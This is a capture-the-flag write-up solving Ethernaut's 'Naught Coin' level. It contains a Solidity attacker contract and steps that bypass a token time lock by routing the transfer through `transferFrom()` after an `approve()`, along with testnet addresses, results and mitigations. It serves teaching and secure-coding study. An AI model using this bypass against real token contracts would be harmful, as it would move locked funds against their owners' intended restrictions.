# Ethernaut #15 — Naught Coin

## Objective

Transfer all the NaughtCoin tokens out of the player's address before the 10-year lock expires.

## Vulnerability: Restricting `transfer()` but Not `transferFrom()`

NaughtCoin is an ERC-20 token with a `timeLock` modifier applied to `transfer()`. The modifier checks whether the 10-year lock has expired and prevents the player from transferring tokens before then.

Initially, I wondered whether the modifier itself could be exploited or whether the time lock could be manipulated. The important question turned out to be simpler: does every way of transferring tokens pass through the same restriction?

ERC-20 provides multiple ways to move tokens. The player can transfer tokens directly with `transfer()`, or authorize a spender with `approve()` and let that spender move tokens using `transferFrom()`.

The restriction applies to `transfer()`, but the inherited `transferFrom()` follows a different entry point. It checks the allowance and then transfers the tokens without invoking the time-lock modifier on `transfer()`.

## Root Cause

The contract restricts one public transfer function instead of enforcing the time lock across every token-transfer path.

The inherited ERC-20 `transferFrom()` function can move tokens from the player to an approved spender without passing through the modifier applied to `transfer()`.

## Attack Contract

```solidity
contract Attacker {
    address public immutable player;
    address public immutable token;
    uint256 public amount;

    constructor(address _player, address _token) {
        player = _player;
        token = _token;
        amount = NaughtCoin(_token).balanceOf(player);
    }

    function attack() external returns (bool) {
        // Transfer tokens to the attack contract.
        bool success = NaughtCoin(token).transferFrom(
            player,
            address(this),
            amount
        );
        return success;
    }

    function checkBalance() external view returns (uint256) {
        return NaughtCoin(token).balanceOf(address(this));
    }
}
```

The constructor stores the player's address, the token address, and the player's balance at deployment time.

The `attack()` function then calls `transferFrom()` to move that amount from the player to the attacker contract. `checkBalance()` lets me verify how many tokens the attacker contract received.

I initially tried calling `approve()` from inside the attacker contract. That would have approved the attacker contract to spend tokens belonging to the attacker contract's own address, not the player's tokens.

The fix was to approve the attacker contract directly from the player's EOA.

## Exploit

1. Inspect NaughtCoin and identify that the time-lock modifier is applied to `transfer()`.
2. Compare `transfer()` with the inherited `transferFrom()` implementation and notice that the latter does not pass through the restricted function.
3. Deploy the attacker contract with the player's address and the NaughtCoin token address.
4. From the player's EOA, call `approve()` on NaughtCoin, setting the spender to the deployed attacker contract and the allowance to the full token balance.
5. Call `attack()` on the attacker contract. Its `transferFrom()` call moves the approved tokens from the player to the attacker contract.
6. Verify the received balance using `checkBalance()`.

The attack contract was deployed at:

`0xbD5cd442DAbeD03A2e6A703fbC661b60BF5359EC`

The NaughtCoin token address was:

`0xFf841AC20b345d845C3a2E4a494fDBd587a0b8E8`

The `attack()` transaction succeeded on Sepolia. Its logs included an `Approval` event for the attacker contract and a `Transfer` event from the player to the attacker contract.

Calling `checkBalance()` returned:

`1000000000000000000000000`

With 18 decimals, this is 1,000,000 NGT.

Transaction hash:

`0x9b20271305e80f211d28a412ef3a8402d1405821c363f2b544309f60f02525b7`

## Impact

The 10-year restriction can be bypassed through the inherited `transferFrom()` function. A player can approve a spender and have it transfer the locked tokens to another address without waiting for the time lock to expire.

The restriction therefore does not enforce the intended transfer policy across all available ERC-20 transfer paths.

## Key Takeaways

- Restricting one public function does not automatically restrict other functions that can reach the same underlying state changes.
- ERC-20 `transfer()` and `transferFrom()` are separate entry points.
- `approve()` records an allowance for the token owner's address and a specified spender.
- The address calling `approve()` matters. An attacker contract approving itself does not grant it permission to spend the player's tokens.
- `transferFrom()` checks the spender's allowance before moving tokens.
- Trace inherited implementations instead of assuming they invoke an overridden or restricted public function.
- Verify the result on-chain by checking balances and inspecting transaction events.

## Mitigation

- Enforce the time-lock restriction in the shared internal transfer logic so that every transfer path is subject to the same policy.
- In modern OpenZeppelin ERC-20 implementations, shared transfer logic can be customized through the appropriate internal transfer hook, such as `_update()`, depending on the version.
- Test restrictions across all relevant paths, including `transfer()`, `transferFrom()`, and any other function capable of moving tokens.
- Treat inherited functions as part of the contract's security surface rather than reviewing only functions explicitly defined in the derived contract.